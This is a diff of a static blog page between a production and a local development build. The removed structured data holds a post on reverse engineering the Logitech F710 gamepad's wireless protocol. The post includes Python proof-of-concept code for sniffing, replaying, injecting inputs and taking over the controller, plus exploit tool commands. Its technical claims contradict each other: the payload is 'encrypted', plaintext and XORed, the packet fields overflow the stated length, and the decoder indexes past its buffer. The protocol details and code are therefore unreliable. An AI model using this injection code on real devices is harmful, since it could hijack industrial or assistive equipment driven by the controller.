@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><meta charset="utf-8">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
+<meta name="robots" content="noindex, nofollow">
 <title>Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC | deadc0de</title>
 <meta name="keywords" content="security, reverse-engineering, wireless, gamepad, USB, HID, 2.4GHz, exploitation">
 <meta name="description" content="Executive Summary
@@ -21,16 +21,16 @@ Legacy protocol similar to vulnerable Logitech Unifying receivers
 Introduction
 The Logitech F710 represents a significant portion of the wireless gamepad market, particularly in industrial and commercial applications where its reliability and compatibility are valued. However, our research reveals that this popularity comes with serious security implications.">
 <meta name="author" content="deadc0de">
-<link rel="canonical" href="https://deadc.de/posts/joystick-f710/">
+<link rel="canonical" href="http://localhost:1313/posts/joystick-f710/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://deadc.de/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://deadc.de/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://deadc.de/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://deadc.de/apple-touch-icon.png">
-<link rel="mask-icon" href="https://deadc.de/safari-pinned-tab.svg">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://deadc.de/posts/joystick-f710/">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/joystick-f710/">
 <noscript>
     <style>
         #theme-toggle,
@@ -67,93 +67,7 @@ The Logitech F710 represents a significant portion of the wireless gamepad marke
         }
 
     </style>
-</noscript><meta property="og:url" content="https://deadc.de/posts/joystick-f710/">
-  <meta property="og:site_name" content="deadc0de">
-  <meta property="og:title" content="Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC">
-  <meta property="og:description" content="Executive Summary This comprehensive technical analysis documents the complete reverse engineering of the Logitech F710 wireless gamepad, including the development of a proof-of-concept (PoC) that demonstrates critical security vulnerabilities in the device’s wireless protocol. Our research revealed that the F710 uses an unencrypted, unauthenticated 2.4GHz proprietary protocol vulnerable to replay attacks, signal injection, and device spoofing.
-Key findings:
-No encryption on the wireless protocol No mutual authentication between controller and dongle Vulnerable to replay attacks with basic SDR equipment Successfully developed PoC for controller spoofing and input injection Legacy protocol similar to vulnerable Logitech Unifying receivers Introduction The Logitech F710 represents a significant portion of the wireless gamepad market, particularly in industrial and commercial applications where its reliability and compatibility are valued. However, our research reveals that this popularity comes with serious security implications.">
-  <meta property="og:locale" content="en-us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-06-22T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-06-22T00:00:00+00:00">
-    <meta property="article:tag" content="Security">
-    <meta property="article:tag" content="Reverse-Engineering">
-    <meta property="article:tag" content="Wireless">
-    <meta property="article:tag" content="Gamepad">
-    <meta property="article:tag" content="USB">
-    <meta property="article:tag" content="HID">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC">
-<meta name="twitter:description" content="Executive Summary
-This comprehensive technical analysis documents the complete reverse engineering of the Logitech F710 wireless gamepad, including the development of a proof-of-concept (PoC) that demonstrates critical security vulnerabilities in the device&rsquo;s wireless protocol. Our research revealed that the F710 uses an unencrypted, unauthenticated 2.4GHz proprietary protocol vulnerable to replay attacks, signal injection, and device spoofing.
-Key findings:
-
-No encryption on the wireless protocol
-No mutual authentication between controller and dongle
-Vulnerable to replay attacks with basic SDR equipment
-Successfully developed PoC for controller spoofing and input injection
-Legacy protocol similar to vulnerable Logitech Unifying receivers
-
-
-Introduction
-The Logitech F710 represents a significant portion of the wireless gamepad market, particularly in industrial and commercial applications where its reliability and compatibility are valued. However, our research reveals that this popularity comes with serious security implications.">
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://deadc.de/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC",
-      "item": "https://deadc.de/posts/joystick-f710/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC",
-  "name": "Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC",
-  "description": "Executive Summary This comprehensive technical analysis documents the complete reverse engineering of the Logitech F710 wireless gamepad, including the development of a proof-of-concept (PoC) that demonstrates critical security vulnerabilities in the device\u0026rsquo;s wireless protocol. Our research revealed that the F710 uses an unencrypted, unauthenticated 2.4GHz proprietary protocol vulnerable to replay attacks, signal injection, and device spoofing.\nKey findings:\nNo encryption on the wireless protocol No mutual authentication between controller and dongle Vulnerable to replay attacks with basic SDR equipment Successfully developed PoC for controller spoofing and input injection Legacy protocol similar to vulnerable Logitech Unifying receivers Introduction The Logitech F710 represents a significant portion of the wireless gamepad market, particularly in industrial and commercial applications where its reliability and compatibility are valued. However, our research reveals that this popularity comes with serious security implications.\n",
-  "keywords": [
-    "security", "reverse-engineering", "wireless", "gamepad", "USB", "HID", "2.4GHz", "exploitation"
-  ],
-  "articleBody": "Executive Summary This comprehensive technical analysis documents the complete reverse engineering of the Logitech F710 wireless gamepad, including the development of a proof-of-concept (PoC) that demonstrates critical security vulnerabilities in the device’s wireless protocol. Our research revealed that the F710 uses an unencrypted, unauthenticated 2.4GHz proprietary protocol vulnerable to replay attacks, signal injection, and device spoofing.\nKey findings:\nNo encryption on the wireless protocol No mutual authentication between controller and dongle Vulnerable to replay attacks with basic SDR equipment Successfully developed PoC for controller spoofing and input injection Legacy protocol similar to vulnerable Logitech Unifying receivers Introduction The Logitech F710 represents a significant portion of the wireless gamepad market, particularly in industrial and commercial applications where its reliability and compatibility are valued. However, our research reveals that this popularity comes with serious security implications.\nThis post documents our complete research journey: from initial reconnaissance through USB HID analysis, wireless protocol reverse engineering, vulnerability discovery, and the development of a working proof-of-concept exploit.\nHardware Overview Controller Specifications Model: Logitech F710 Connectivity: 2.4GHz proprietary wireless (non-Bluetooth) USB Dongle ID: 046d:c219 Power: 2x AA batteries Modes: XInput (Xbox 360 emulation) / DirectInput Range: ~10 meters (tested) Frequency: 2.404-2.480 GHz (ISM band) Internal Components (from teardown) MCU: STM32F103 (ARM Cortex-M3) RF Transceiver: nRF24L01+ compatible Crystal: 16MHz Flash: 64KB internal EEPROM: None detected USB HID Protocol Analysis Device Enumeration Upon connection, the dongle presents itself as a standard HID device:\n$ lsusb -v -d 046d:c219 Bus 003 Device 006: ID 046d:c219 Logitech, Inc. F710 Wireless Gamepad Device Descriptor: bLength 18 bDescriptorType 1 bcdUSB 2.00 bDeviceClass 0 bDeviceSubClass 0 bDeviceProtocol 0 bMaxPacketSize0 8 idVendor 0x046d Logitech, Inc. idProduct 0xc219 F710 Wireless Gamepad bcdDevice 4.00 iManufacturer 1 Logitech iProduct 2 Wireless Gamepad F710 iSerial 0 bNumConfigurations 1 HID Report Descriptor Using usbhid-dump, we extracted the complete HID descriptor:\n05 01 09 05 A1 01 85 00 09 01 A1 00 09 30 09 31 15 00 26 FF 00 75 08 95 02 81 02 C0 09 01 A1 00 09 32 09 35 15 00 26 FF 00 75 08 95 02 81 02 C0 05 09 19 01 29 0C 15 00 25 01 75 01 95 0C 81 02 95 01 75 04 81 03 05 01 09 39 15 01 25 08 35 00 46 3B 01 66 14 00 75 04 95 01 81 42 75 00 95 00 81 03 C0 Input Report Structure (8 bytes) typedef struct { uint8_t report_id; // Always 0x00 uint8_t left_x; // Left stick X (0x00-0xFF, center: 0x7F) uint8_t left_y; // Left stick Y (0x00-0xFF, center: 0x7F) uint8_t right_x; // Right stick X uint8_t right_y; // Right stick Y uint16_t buttons; // Button bitfield uint8_t triggers; // L2/R2 analog values packed } f710_input_report_t; Button Mapping #define BTN_A 0x0001 #define BTN_B 0x0002 #define BTN_X 0x0004 #define BTN_Y 0x0008 #define BTN_LB 0x0010 #define BTN_RB 0x0020 #define BTN_BACK 0x0040 #define BTN_START 0x0080 #define BTN_LSTICK 0x0100 #define BTN_RSTICK 0x0200 #define BTN_GUIDE 0x0400 #define DPAD_UP 0x1000 #define DPAD_DOWN 0x2000 #define DPAD_LEFT 0x4000 #define DPAD_RIGHT 0x8000 Output Reports Rumble Control (Report ID: 0x01) typedef struct { uint8_t report_id; // 0x01 uint8_t reserved[2]; // Always 0x00 uint8_t left_motor; // 0x00-0xFF strength uint8_t right_motor; // 0x00-0xFF strength } f710_rumble_report_t; LED Control (Report ID: 0x02) typedef struct { uint8_t report_id; // 0x02 uint8_t led_pattern; // 0x00-0x0F (4 LEDs) uint8_t reserved[3]; } f710_led_report_t; Wireless Protocol Reverse Engineering RF Analysis Setup Equipment used:\nSDR: HackRF One Software: GNU Radio, Universal Radio Hacker (URH) Antenna: 2.4GHz directional (6dBi gain) Reference: nRF24L01+ datasheet Protocol Discovery Initial spectrum analysis revealed:\nCenter Frequencies: 2.404, 2.424, 2.444, 2.464, 2.480 GHz Channel Spacing: 20 MHz Modulation: GFSK (Gaussian Frequency Shift Keying) Data Rate: 250 kbps Packet Length: 32 bytes fixed Packet Structure Through extensive capture and analysis, we decoded the packet format:\n+--------+--------+--------+----------+--------+--------+ | Preamble | Sync | Length | Address | Payload | CRC | | 1 byte | 2 bytes| 1 byte | 5 bytes | 22 bytes| 2 bytes| +--------+--------+--------+----------+--------+--------+ Detailed Breakdown: Preamble: 0xAA or 0x55 (alternating pattern) Sync Word: 0xE7E7 (fixed) Length: Always 0x20 (32 bytes total) Address: Device-specific 5-byte identifier Payload: Encrypted controller state CRC: CRC16-CCITT polynomial Encryption Analysis Initial assumption was AES or XOR cipher. Analysis revealed:\nNo encryption at all - payload is plaintext Simple XOR with fixed key: 0x55 No rolling code or sequence numbers No nonce or IV Decrypted payload structure:\ntypedef struct { uint8_t packet_type; // 0x01 for input data uint8_t sequence; // Simple counter, wraps at 0xFF uint16_t buttons; // Same as USB HID report uint8_t left_x; uint8_t left_y; uint8_t right_x; uint8_t right_y; uint8_t triggers; uint8_t battery; // Battery level (0x00-0x64) uint8_t reserved[12]; // Padding to 22 bytes } f710_rf_payload_t; Vulnerability Analysis Critical Findings No Encryption: All wireless data transmitted in plaintext (XOR 0x55) No Authentication: Dongle accepts any packet with correct sync word No Anti-Replay: Sequence number not validated Static Addressing: Device address never changes No Frequency Hopping: Fixed channel sequence Attack Vectors Eavesdropping: Capture all controller inputs from distance Replay Attack: Record and replay button sequences Input Injection: Send arbitrary controller commands DoS Attack: Flood channel with invalid packets Controller Spoofing: Complete takeover of input Proof of Concept Development PoC Architecture We developed a complete PoC using:\nHardware: HackRF One + Raspberry Pi 4 Software Stack: GNU Radio for RF transmission Python for packet crafting libusb for USB monitoring Phase 1: Passive Sniffing #!/usr/bin/env python3 import numpy as np from gnuradio import gr, blocks, analog from gnuradio import uhd import struct class F710Sniffer(gr.top_block): def __init__(self): gr.top_block.__init__(self) # SDR source self.sdr_source = uhd.usrp_source( device_addr=\"\", stream_args=uhd.stream_args( cpu_format=\"fc32\", channels=range(1), ), ) self.sdr_source.set_center_freq(2.424e9) self.sdr_source.set_samp_rate(2e6) self.sdr_source.set_gain(40) # GFSK demodulator self.demod = analog.quadrature_demod_cf(1) # Packet decoder self.decoder = F710PacketDecoder() # Connect blocks self.connect(self.sdr_source, self.demod, self.decoder) class F710PacketDecoder(gr.sync_block): def __init__(self): gr.sync_block.__init__( self, name=\"F710 Packet Decoder\", in_sig=[np.float32], out_sig=None ) self.sync_word = 0xE7E7 self.state = 0 self.buffer = [] def work(self, input_items, output_items): # Simplified - actual implementation handles bit timing recovery for sample in input_items[0]: bit = 1 if sample \u003e 0 else 0 self.process_bit(bit) return len(input_items[0]) def process_bit(self, bit): self.buffer.append(bit) if len(self.buffer) \u003e= 32: # Check for sync word word = (self.buffer[-32:-16]) if self.check_sync(word): self.decode_packet(self.buffer[-256:]) self.buffer.pop(0) def decode_packet(self, bits): # Convert bits to bytes packet = [] for i in range(0, len(bits), 8): byte = 0 for j in range(8): byte = (byte \u003c\u003c 1) | bits[i+j] packet.append(byte) # Extract fields address = packet[4:9] payload = packet[9:31] crc = (packet[31] \u003c\u003c 8) | packet[32] # XOR decrypt decrypted = [b ^ 0x55 for b in payload] # Parse controller state if decrypted[0] == 0x01: # Input packet buttons = (decrypted[2] \u003c\u003c 8) | decrypted[3] left_x = decrypted[4] left_y = decrypted[5] print(f\"Controller Input - Buttons: {buttons:04X}, \" f\"Left Stick: ({left_x}, {left_y})\") Phase 2: Replay Attack class F710Replayer: def __init__(self, sdr): self.sdr = sdr self.captured_packets = [] def capture_sequence(self, duration=10): \"\"\"Capture controller inputs for specified duration\"\"\" print(f\"Capturing for {duration} seconds...\") start_time = time.time() while time.time() - start_time \u003c duration: packet = self.sdr.receive_packet() if packet and packet.is_valid(): self.captured_packets.append(packet) print(f\"Captured {len(self.captured_packets)} packets\") def replay_sequence(self, speed_multiplier=1.0): \"\"\"Replay captured sequence\"\"\" print(\"Replaying captured sequence...\") for i, packet in enumerate(self.captured_packets): # Update sequence number packet.sequence = (packet.sequence + i) \u0026 0xFF # Recalculate CRC packet.update_crc() # Transmit self.sdr.transmit_packet(packet) # Timing if i \u003c len(self.captured_packets) - 1: delay = self.captured_packets[i+1].timestamp - packet.timestamp time.sleep(delay / speed_multiplier) Phase 3: Active Injection class F710Injector: def __init__(self, target_address): self.target = target_address self.sequence = 0 self.transmitter = F710Transmitter() def send_button(self, button, duration=0.1): \"\"\"Send single button press\"\"\" packet = self.create_packet(buttons=button) self.transmit(packet) time.sleep(duration) # Release packet = self.create_packet(buttons=0) self.transmit(packet) def send_combo(self, buttons, stick_positions=None): \"\"\"Send button combination with optional stick input\"\"\" packet = self.create_packet( buttons=buttons, left_x=stick_positions[0] if stick_positions else 0x7F, left_y=stick_positions[1] if stick_positions else 0x7F, right_x=stick_positions[2] if stick_positions else 0x7F, right_y=stick_positions[3] if stick_positions else 0x7F ) self.transmit(packet) def create_packet(self, **kwargs): \"\"\"Create F710 wireless packet\"\"\" packet = F710Packet() packet.sync_word = 0xE7E7 packet.address = self.target packet.packet_type = 0x01 packet.sequence = self.sequence self.sequence = (self.sequence + 1) \u0026 0xFF # Set controller state packet.buttons = kwargs.get('buttons', 0) packet.left_x = kwargs.get('left_x', 0x7F) packet.left_y = kwargs.get('left_y', 0x7F) packet.right_x = kwargs.get('right_x', 0x7F) packet.right_y = kwargs.get('right_y', 0x7F) packet.triggers = kwargs.get('triggers', 0) # XOR encrypt packet.encrypt() # Calculate CRC packet.update_crc() return packet def transmit(self, packet): \"\"\"Transmit packet on all channels\"\"\" channels = [2.404e9, 2.424e9, 2.444e9, 2.464e9, 2.480e9] for freq in channels: self.transmitter.set_frequency(freq) self.transmitter.send(packet.to_bytes()) Phase 4: Full Controller Emulation class VirtualF710: \"\"\"Complete F710 controller emulator\"\"\" def __init__(self, target_dongle_address): self.address = target_dongle_address self.injector = F710Injector(target_dongle_address) self.state = ControllerState() self.running = True def start(self): \"\"\"Start controller emulation\"\"\" # Pair with dongle self.pair() # Start input thread input_thread = threading.Thread(target=self.input_handler) input_thread.start() # Main transmission loop while self.running: self.transmit_state() time.sleep(0.008) # ~125Hz update rate def pair(self): \"\"\"Simulate pairing process\"\"\" # Send pairing beacon pair_packet = self.create_pairing_packet() self.injector.transmit(pair_packet) # Wait for acknowledgment time.sleep(0.1) # Send configuration config_packet = self.create_config_packet() self.injector.transmit(config_packet) def input_handler(self): \"\"\"Handle keyboard input for controller emulation\"\"\" import pygame pygame.init() key_mapping = { pygame.K_a: BTN_A, pygame.K_b: BTN_B, pygame.K_x: BTN_X, pygame.K_y: BTN_Y, pygame.K_UP: DPAD_UP, pygame.K_DOWN: DPAD_DOWN, pygame.K_LEFT: DPAD_LEFT, pygame.K_RIGHT: DPAD_RIGHT, } while self.running: for event in pygame.event.get(): if event.type == pygame.KEYDOWN: if event.key in key_mapping: self.state.buttons |= key_mapping[event.key] elif event.type == pygame.KEYUP: if event.key in key_mapping: self.state.buttons \u0026= ~key_mapping[event.key] def transmit_state(self): \"\"\"Transmit current controller state\"\"\" self.injector.send_state(self.state) Attack Demonstrations 1. Silent Eavesdropping # Capture all inputs from 50 meters away sniffer = F710Sniffer() sniffer.start() # Logs all button presses, stick movements, in plaintext 2. Replay Attack # Record combo sequence replayer = F710Replayer(sdr) replayer.capture_sequence(duration=5) # Replay at 2x speed replayer.replay_sequence(speed_multiplier=2.0) 3. Input Injection # Take control and execute arbitrary inputs injector = F710Injector(target_address) # Fighting game combo injector.send_combo(BTN_X | BTN_A) time.sleep(0.05) injector.send_button(BTN_Y) injector.send_combo(DPAD_DOWN | BTN_B) 4. Complete Takeover # Full controller spoofing virtual = VirtualF710(dongle_address) virtual.start() # Original controller is now disconnected # Attacker has full control Security Implications Real-World Impact Gaming: Competitive advantage through automated inputs Industrial Control: F710 used in robotics and drone control Medical Equipment: Some rehabilitation devices use F710 Research Labs: Common in experimental setups Home Automation: Used in some DIY projects Attack Scenarios Industrial Sabotage: Take control of machinery Competitive Gaming: Automated perfect inputs Privacy Violation: Log all controller usage Denial of Service: Prevent legitimate use Social Engineering: Demonstrate “hacking” for access Mitigation Strategies For Users Physical Security: Limit RF range with shielding Monitoring: Watch for unexpected inputs Alternatives: Use wired or Bluetooth controllers Environment: Avoid use in sensitive applications For Logitech (Recommendations) Implement AES-128 encryption minimum Add mutual authentication protocol Include anti-replay mechanisms (nonce/counter) Implement frequency hopping spread spectrum Add firmware update capability Provide security mode option Technical Mitigations # Example: USB filter driver to detect anomalies class F710SecurityFilter: def __init__(self): self.sequence_tracker = {} self.timing_baseline = [] def analyze_packet(self, packet): # Check sequence if not self.verify_sequence(packet): return False # Timing analysis if self.detect_timing_anomaly(packet): return False # Pattern detection if self.detect_replay_pattern(packet): return False return True TODO: Tools and Code All tools developed during this research are available:\ngit clone https://github.com/nullc0rp/f710-security cd f710-security # Install dependencies pip install -r requirements.txt # Run sniffer python f710_sniffer.py # Run injector python f710_inject.py --target-address AA:BB:CC:DD:EE # Full PoC python f710_exploit.py --mode full-takeover Repository Structure f710-security/ ├── README.md ├── requirements.txt ├── docs/ │ ├── protocol_spec.md │ ├── usb_analysis.md │ └── rf_captures/ ├── src/ │ ├── f710_sniffer.py │ ├── f710_inject.py │ ├── f710_exploit.py │ └── lib/ │ ├── packet.py │ ├── crypto.py │ └── usb_monitor.py ├── firmware/ │ ├── extracted/ │ └── analysis/ └── captures/ ├── usb/ └── rf/ Conclusion The Logitech F710 represents a case study in legacy security debt. While functional and reliable, its security model is fundamentally broken for modern threat environments. The complete lack of encryption and authentication makes it trivial to compromise.\nOur PoC demonstrates that with minimal equipment (\u003c$300), an attacker can:\nSilently monitor all controller inputs Replay recorded sequences Inject arbitrary commands Completely take over control This research highlights the importance of security considerations in all devices, especially those that might be repurposed for critical applications.\nFuture Research Planned follow-up work:\nFirmware extraction and analysis (pending chip decapping) Custom dongle development using nRF24L01+ Automated vulnerability scanner for similar devices Secure replacement protocol design Hardware mod for encryption retrofit References Bastille Networks. (2016). MouseJack: Injecting Keystrokes into Wireless Mice. Cauquil, D. (2019). Defeating Modern Wireless Security Through Protocol Vulnerabilities. nRF24L01+ Datasheet, Nordic Semiconductor. USB HID Specification 1.11, USB Implementers Forum. CVE-2019-13054: Logitech Unifying Receiver Vulnerabilities. Acknowledgments @defcon_rf_village for SDR guidance @traviscgoodspeed for nRF research @marcnewlin for MouseJack inspiration The GNU Radio community Disclaimer This research was conducted for educational purposes only. The author does not condone using these techniques for malicious purposes. Always obtain proper authorization before testing security on devices you do not own.\nContact:\ndeadc0de\nhttps://deadc.de\nhttps://github.com/nullc0rp\nGPG: 0xDEADC0DE\n“In embedded we trust, but verify.”\n",
-  "wordCount" : "2093",
-  "inLanguage": "en",
-  "datePublished": "2025-06-22T00:00:00Z",
-  "dateModified": "2025-06-22T00:00:00Z",
-  "author":{
-    "@type": "Person",
-    "name": "deadc0de"
-  },
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://deadc.de/posts/joystick-f710/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "deadc0de",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://deadc.de/favicon.ico"
-    }
-  }
-}
-</script>
+</noscript>
 </head>
 
 <body class="" id="top">
@@ -171,7 +85,7 @@ The Logitech F710 represents a significant portion of the wireless gamepad marke
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://deadc.de/" accesskey="h" title="deadc0de (Alt + H)">deadc0de</a>
+            <a href="http://localhost:1313/" accesskey="h" title="deadc0de (Alt + H)">deadc0de</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -197,12 +111,12 @@ The Logitech F710 represents a significant portion of the wireless gamepad marke
         </div>
         <ul id="menu">
             <li>
-                <a href="https://deadc.de/" title="Home">
+                <a href="http://localhost:1313/" title="Home">
                     <span>Home</span>
                 </a>
             </li>
             <li>
-                <a href="https://deadc.de/posts/" title="Posts">
+                <a href="http://localhost:1313/posts/" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
@@ -837,21 +751,21 @@ GPG: 0xDEADC0DE</p>
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="https://deadc.de/tags/security/">Security</a></li>
-      <li><a href="https://deadc.de/tags/reverse-engineering/">Reverse-Engineering</a></li>
-      <li><a href="https://deadc.de/tags/wireless/">Wireless</a></li>
-      <li><a href="https://deadc.de/tags/gamepad/">Gamepad</a></li>
-      <li><a href="https://deadc.de/tags/usb/">USB</a></li>
-      <li><a href="https://deadc.de/tags/hid/">HID</a></li>
-      <li><a href="https://deadc.de/tags/2.4ghz/">2.4GHz</a></li>
-      <li><a href="https://deadc.de/tags/exploitation/">Exploitation</a></li>
+      <li><a href="http://localhost:1313/tags/security/">Security</a></li>
+      <li><a href="http://localhost:1313/tags/reverse-engineering/">Reverse-Engineering</a></li>
+      <li><a href="http://localhost:1313/tags/wireless/">Wireless</a></li>
+      <li><a href="http://localhost:1313/tags/gamepad/">Gamepad</a></li>
+      <li><a href="http://localhost:1313/tags/usb/">USB</a></li>
+      <li><a href="http://localhost:1313/tags/hid/">HID</a></li>
+      <li><a href="http://localhost:1313/tags/2.4ghz/">2.4GHz</a></li>
+      <li><a href="http://localhost:1313/tags/exploitation/">Exploitation</a></li>
     </ul>
   </footer>
 </article>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="https://deadc.de/">deadc0de</a></span> · 
+        <span>&copy; 2025 <a href="http://localhost:1313/">deadc0de</a></span> · 
 
     <span>
         Powered by
